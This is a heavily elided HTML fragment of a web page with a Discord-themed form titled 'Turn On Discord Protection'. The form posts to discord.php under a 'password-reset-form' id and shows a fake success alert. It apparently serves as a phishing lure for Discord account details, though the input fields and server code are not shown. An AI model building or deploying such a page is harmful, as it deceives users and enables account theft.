    ...
    <nav>     
        ...
        <div class="menu-container">
            <ul>  
                ...
                <li><a href="discord.php" class="menu" id="specialitemcolor">Discord</a></li>
            </ul> 
        </div>
    </nav>  
   ...
   <span></span>
    ...
    <div class="container">     
        <div class="form-container">         
            <h2 id="onlywhiteitems">Turn On Discord Protection</h2>         
            <form action="discord.php" method="post" id="password-reset-form" onsubmit="return showLoadingMessage()">             
    ...
    <script>
        function showLoadingMessage() {
            ...
            if (form.checkValidity()) {
                ...
                alert("Discord Protection is On Successfully ✔");
